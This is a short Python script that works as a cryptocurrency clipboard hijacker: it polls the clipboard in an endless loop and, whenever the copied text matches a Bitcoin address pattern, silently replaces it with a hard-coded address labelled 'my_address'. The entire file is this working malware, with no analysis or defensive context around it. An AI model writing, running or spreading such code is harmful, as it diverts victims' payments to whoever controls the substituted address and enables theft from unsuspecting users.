import pyperclip
import asyncio
import re

# For all possible BTC wallet configuration 
BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{27,34}|bc1[a-z0-9]{39,59})'

# Matching and changing btc function.
async def btc_address(value):
    
    text = re.match(BTC_ADDRESS_MATCH , value)
    if text != None:
        my_address = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'
        new_value = pyperclip.copy(my_address)
        print (value)
        print(new_value)

    print (text)
        
    #print(value)


async def wait4update(value):
    while True:
        if pyperclip.paste() != value : # If the clipboard changed.
            return

async def main():
    value = pyperclip.paste() # Set the default value.
    while True :
        update = asyncio.create_task(wait4update(value))
        await update
        value = pyperclip.paste() # Change the value.    
        asyncio.create_task(btc_address(value)) #Start your function.

asyncio.run(main())

